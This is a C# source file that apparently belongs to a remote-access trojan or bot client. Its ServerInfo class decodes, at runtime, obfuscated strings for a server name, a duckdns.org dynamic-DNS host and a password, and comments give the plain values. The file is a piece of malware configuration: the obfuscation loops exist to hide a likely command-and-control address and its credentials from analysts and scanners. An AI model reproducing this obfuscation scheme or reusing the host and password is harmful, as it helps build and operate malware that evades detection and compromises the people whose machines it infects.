namespace bc.srv.Classes
{
    class StringData
    {
        public class ServerInfo
        {
            public static string Name
            {
                get
                {
                    // name = "imback"
                    string name = "\uA006\uD006\u1006\u3006\u8006\uF006";
 
                    for (int vAXxN = 0, jvqiI = 0; vAXxN < 6; vAXxN++)
                    {
                        jvqiI = name[vAXxN];
                        jvqiI = (((jvqiI & 0xFFFF) >> 12) | (jvqiI << 4)) & 0xFFFF;
                        jvqiI --;
                        jvqiI ^= vAXxN;
                        name = name.Substring(0, vAXxN) + (char)(jvqiI & 0xFFFF) + name.Substring(vAXxN + 1);
                    }

                    return name;
                }
            }

            public static string Host
            {
                get
                {
                    // host = "lqphnd2gfz.duckdns.org"
                    string host = "\uCE11\uCDBB\uCCE5\uCCC3\uCD19\uCA77\uCB6D\uC9F7" +
                                  "\uCBB9\uCB9F\uC59D\uCB03\uC58D\uC46B\uC399\uC403" +
                                  "\uC219\uC1C3\uBF9D\uC0CF\uC189\uBE8B";
 
                    for (int EOkbz = 0, HDCJm = 0; EOkbz < 22; EOkbz++)
                    {
                        HDCJm = host[EOkbz];
                        HDCJm += 0xD786;
                        HDCJm -= EOkbz;
                        HDCJm -= 0xB1F2;
                        HDCJm = ((HDCJm << 9) | ( (HDCJm & 0xFFFF) >> 7)) & 0xFFFF;
                        HDCJm += EOkbz;
                        HDCJm --;
                        HDCJm = ((HDCJm << 1) | ( (HDCJm & 0xFFFF) >> 15)) & 0xFFFF;
                        HDCJm -= EOkbz;
                        HDCJm ^= EOkbz;
                        HDCJm += EOkbz;
                        HDCJm --;
                        HDCJm ^= 0xD223;
                        HDCJm = ((HDCJm << 4) | ( (HDCJm & 0xFFFF) >> 12)) & 0xFFFF;
                        HDCJm --;
                        HDCJm ^= 0xBE2B;
                        HDCJm += 0x10B8;
                        HDCJm = ~HDCJm;
                        HDCJm = ((HDCJm << 2) | ( (HDCJm & 0xFFFF) >> 14)) & 0xFFFF;
                        HDCJm ^= 0x6110;
                        HDCJm += 0xD295;
                        HDCJm = ~HDCJm;
                        HDCJm ^= EOkbz;
                        HDCJm -= 0xAF04;
                        HDCJm = ((HDCJm << 14) | ( (HDCJm & 0xFFFF) >> 2)) & 0xFFFF;
                        HDCJm += EOkbz;
                        HDCJm += 0x9AE8;
                        HDCJm = ~HDCJm;
                        HDCJm += EOkbz;
                        HDCJm ^= 0xDC35;
                        host = host.Substring(0, EOkbz) + (char)(HDCJm & 0xFFFF) + host.Substring(EOkbz + 1);
                    }

                    return host;
                }
            }

            public static string Password
            {
                get
                {
                    // password = "slevin"
                    string password = "\u10D3\u12D3\u14D3\u10D3\u1253\uBD53";
 
                    for (int RqnCs = 0, lgDaw = 0; RqnCs < 6; RqnCs++)
                    {
                        lgDaw = password[RqnCs];
                        lgDaw += 0x18B6;
                        lgDaw ^= 0xA9EC;
                        lgDaw -= RqnCs;
                        lgDaw --;
                        lgDaw += RqnCs;
                        lgDaw -= 0xCC6F;
                        lgDaw = ((lgDaw << 7) | ( (lgDaw & 0xFFFF) >> 9)) & 0xFFFF;
                        lgDaw ^= 0x6528;
                        lgDaw = (((lgDaw & 0xFFFF) >> 13) | (lgDaw << 3)) & 0xFFFF;
                        lgDaw += RqnCs;
                        lgDaw ^= RqnCs;
                        lgDaw = ~lgDaw;
                        lgDaw += RqnCs;
                        password = password.Substring(0, RqnCs) + (char)(lgDaw & 0xFFFF) + password.Substring(RqnCs + 1);
                    }

                    return password;
                }
            }
        }    
    }
}